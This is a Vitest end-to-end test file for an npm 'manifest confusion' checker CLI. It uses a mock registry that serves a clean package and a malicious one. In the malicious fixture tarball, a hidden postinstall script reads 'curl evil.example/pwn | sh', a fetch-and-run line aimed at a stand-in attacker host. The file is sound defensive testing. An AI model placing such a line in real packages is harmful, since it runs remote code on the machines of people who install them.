import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import * as http from 'node:http';
import * as path from 'node:path';
import * as fs from 'node:fs';
import * as os from 'node:os';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { createSyntheticTarball } from './helpers/make-tarball.js';

const execFileAsync = promisify(execFile);
const CLI_PATH = path.resolve(__dirname, '../dist/cli.js');

describe('CLI E2E Tests', () => {
  let server: http.Server;
  let serverUrl: string;
  let cleanTarballBuffer: Buffer;
  let maliciousTarballBuffer: Buffer;
  let cleanTarballCleanup: () => Promise<void>;
  let maliciousTarballCleanup: () => Promise<void>;

  beforeAll(async () => {
    // 1. Build synthetic clean tarball
    const cleanTar = await createSyntheticTarball({
      packageJson: {
        name: 'test-clean-pkg',
        version: '1.0.0',
        description: 'Clean package',
        scripts: { test: 'vitest' },
      },
    });
    cleanTarballBuffer = cleanTar.buffer;
    cleanTarballCleanup = cleanTar.cleanup;

    // 2. Build synthetic malicious tarball with hidden postinstall
    const maliciousTar = await createSyntheticTarball({
      packageJson: {
        name: 'test-malicious-pkg',
        version: '1.0.0',
        description: 'Malicious package',
        scripts: {
          test: 'vitest',
          postinstall: 'curl evil.example/pwn | sh',
        },
      },
    });
    maliciousTarballBuffer = maliciousTar.buffer;
    maliciousTarballCleanup = maliciousTar.cleanup;

    // 3. Start local mock npm registry
    server = http.createServer((req, res) => {
      const url = req.url || '';

      if (url === '/test-clean-pkg') {
        const doc = {
          name: 'test-clean-pkg',
          'dist-tags': { latest: '1.0.0' },
          versions: {
            '1.0.0': {
              name: 'test-clean-pkg',
              version: '1.0.0',
              description: 'Clean package',
              scripts: { test: 'vitest' },
              dist: {
                tarball: `${serverUrl}/tarballs/test-clean-pkg-1.0.0.tgz`,
              },
            },
          },
        };
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(doc));
        return;
      }

      if (url === '/tarballs/test-clean-pkg-1.0.0.tgz') {
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(cleanTarballBuffer);
        return;
      }

      if (url === '/test-malicious-pkg') {
        // Registry manifest does NOT have postinstall!
        const doc = {
          name: 'test-malicious-pkg',
          'dist-tags': { latest: '1.0.0' },
          versions: {
            '1.0.0': {
              name: 'test-malicious-pkg',
              version: '1.0.0',
              description: 'Malicious package',
              scripts: { test: 'vitest' },
              dist: {
                tarball: `${serverUrl}/tarballs/test-malicious-pkg-1.0.0.tgz`,
              },
            },
          },
        };
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(doc));
        return;
      }

      if (url === '/tarballs/test-malicious-pkg-1.0.0.tgz') {
        res.writeHead(200, { 'Content-Type': 'application/octet-stream' });
        res.end(maliciousTarballBuffer);
        return;
      }

      res.writeHead(404);
      res.end('Not found');
    });

    await new Promise<void>((resolve) => {
      server.listen(0, '127.0.0.1', () => {
        const addr = server.address() as { port: number };
        serverUrl = `http://127.0.0.1:${addr.port}`;
        resolve();
      });
    });
  });

  afterAll(async () => {
    if (server) {
      await new Promise<void>((resolve) => server.close(() => resolve()));
    }
    if (cleanTarballCleanup) await cleanTarballCleanup();
    if (maliciousTarballCleanup) await maliciousTarballCleanup();
  });

  it('prints help and exits with code 0 on --help', async () => {
    const { stdout } = await execFileAsync('node', [CLI_PATH, '--help']);
    expect(stdout).toContain('manifestlock');
    expect(stdout).toContain('USAGE');
  });

  it('exits with code 0 when package is clean and manifest matches tarball', async () => {
    const { stdout } = await execFileAsync('node', [
      CLI_PATH,
      'check',
      'test-clean-pkg@1.0.0',
      '--registry',
      serverUrl,
    ]);

    expect(stdout).toContain('manifest matches tarball (clean)');
  });

  it('exits with code 1 when manifest confusion is detected with critical mismatch', async () => {
    let error: any;
    try {
      await execFileAsync('node', [
        CLI_PATH,
        'check',
        'test-malicious-pkg@1.0.0',
        '--registry',
        serverUrl,
      ]);
    } catch (err) {
      error = err;
    }

    expect(error).toBeDefined();
    expect(error.code).toBe(1);
    expect(error.stdout).toContain('Manifest confusion detected!');
    expect(error.stdout).toContain('scripts.postinstall');
  });

  it('outputs valid JSON when --json flag is supplied', async () => {
    const { stdout } = await execFileAsync('node', [
      CLI_PATH,
      'check',
      'test-clean-pkg@1.0.0',
      '--registry',
      serverUrl,
      '--json',
    ]);

    const parsed = JSON.parse(stdout);
    expect(parsed).toMatchObject({
      packageName: 'test-clean-pkg',
      match: true,
      mismatches: [],
    });
  });

  it('audits a clean project lockfile and reports exit code 0 with summary', async () => {
    const tempProject = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'audit-clean-'));
    try {
      const lockfile = {
        lockfileVersion: 3,
        packages: {
          '': { name: 'my-app', version: '1.0.0' },
          'node_modules/test-clean-pkg': {
            version: '1.0.0',
            resolved: `${serverUrl}/tarballs/test-clean-pkg-1.0.0.tgz`,
          },
        },
      };
      await fs.promises.writeFile(
        path.join(tempProject, 'package-lock.json'),
        JSON.stringify(lockfile),
      );

      const { stdout } = await execFileAsync('node', [
        CLI_PATH,
        'audit',
        '--path',
        tempProject,
        '--registry',
        serverUrl,
      ]);

      expect(stdout).toContain('1 packages checked, 0 mismatches found');
    } finally {
      await fs.promises.rm(tempProject, { recursive: true, force: true });
    }
  });

  it('audits a project with malicious dependency, failing with exit code 1', async () => {
    const tempProject = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'audit-fail-'));
    try {
      const lockfile = {
        lockfileVersion: 3,
        packages: {
          '': { name: 'my-app', version: '1.0.0' },
          'node_modules/test-malicious-pkg': {
            version: '1.0.0',
            resolved: `${serverUrl}/tarballs/test-malicious-pkg-1.0.0.tgz`,
          },
        },
      };
      await fs.promises.writeFile(
        path.join(tempProject, 'package-lock.json'),
        JSON.stringify(lockfile),
      );

      let error: any;
      try {
        await execFileAsync('node', [
          CLI_PATH,
          'audit',
          '--path',
          tempProject,
          '--registry',
          serverUrl,
        ]);
      } catch (err) {
        error = err;
      }

      expect(error).toBeDefined();
      expect(error.code).toBe(1);
      expect(error.stdout).toContain('Audit failed');
      expect(error.stdout).toContain('scripts.postinstall');
    } finally {
      await fs.promises.rm(tempProject, { recursive: true, force: true });
    }
  });

  it('supports --ignore flag to suppress known false positives', async () => {
    const tempProject = await fs.promises.mkdtemp(path.join(os.tmpdir(), 'audit-ignore-'));
    try {
      const lockfile = {
        lockfileVersion: 3,
        packages: {
          '': { name: 'my-app', version: '1.0.0' },
          'node_modules/test-malicious-pkg': {
            version: '1.0.0',
            resolved: `${serverUrl}/tarballs/test-malicious-pkg-1.0.0.tgz`,
          },
        },
      };
      await fs.promises.writeFile(
        path.join(tempProject, 'package-lock.json'),
        JSON.stringify(lockfile),
      );

      // Should exit 0 because test-malicious-pkg is ignored
      const { stdout } = await execFileAsync('node', [
        CLI_PATH,
        'audit',
        '--path',
        tempProject,
        '--registry',
        serverUrl,
        '--ignore',
        'test-malicious-pkg',
      ]);

      expect(stdout).toContain('0 packages checked, 0 mismatches found');
      expect(stdout).toContain('1 packages ignored via --ignore');
    } finally {
      await fs.promises.rm(tempProject, { recursive: true, force: true });
    }
  });
});
